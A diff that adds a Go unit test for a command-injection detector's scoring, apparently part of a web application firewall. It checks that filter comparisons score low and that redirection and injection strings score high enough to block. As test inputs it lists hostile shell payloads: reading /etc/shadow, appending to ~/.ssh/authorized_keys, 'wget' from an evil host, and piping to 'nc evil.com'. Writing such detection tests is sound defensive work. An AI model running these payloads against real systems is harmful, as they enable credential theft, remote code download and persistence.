@@ -775,3 +775,66 @@ func TestCoverageGaps(t *testing.T) {
 		t.Fatalf("normalized Referer action = %v, want log", result.Action)
 	}
 }
+
+// TestRedirectionTargetShapes covers the split in checkRedirection. A bare '>'
+// is ambiguous, so the score now depends on whether a redirection *target*
+// follows. Comparisons used by filter APIs previously scored 45 — within one
+// weak signal of the default block threshold of 50 — which blocked legitimate
+// traffic such as `?filter=price>100` from non-browser clients.
+func TestRedirectionTargetShapes(t *testing.T) {
+	score := func(input string) int {
+		total := 0
+		for _, f := range Detect(input, "query") {
+			total += f.Score
+		}
+		return total
+	}
+
+	t.Run("comparisons score low", func(t *testing.T) {
+		for _, input := range []string{
+			"price>100",
+			"price > 100",
+			"5 > 3",
+			"a>b",
+			"qty>=10",
+			"score>50&sort=name",
+		} {
+			// Low enough that another weak signal cannot tip it over the block
+			// threshold on its own.
+			if got := score(input); got > 25 {
+				t.Errorf("%q scored %d, want <= 25", input, got)
+			}
+		}
+	})
+
+	t.Run("file and fd targets keep the redirection score", func(t *testing.T) {
+		for _, input := range []string{
+			"cat /etc/passwd > /tmp/x",
+			"echo pwn > ~/.ssh/authorized_keys",
+			"whoami >> /var/log/x.log",
+			"id 2>&1",
+			"dump > out.txt",
+		} {
+			if got := score(input); got < 45 {
+				t.Errorf("%q scored %d, want >= 45", input, got)
+			}
+		}
+	})
+
+	// Redirection is a supporting signal; the separator/substitution rules are
+	// what carry a full injection over the block threshold.
+	t.Run("full injection payloads still block", func(t *testing.T) {
+		for _, input := range []string{
+			"; ls > /tmp/out",
+			"; wget http://evil/x.sh > /tmp/x.sh",
+			"; cat /etc/shadow",
+			"| nc evil.com 1234",
+			"$(whoami)",
+			"`id`",
+		} {
+			if got := score(input); got < 50 {
+				t.Errorf("%q scored %d, want >= 50", input, got)
+			}
+		}
+	})
+}
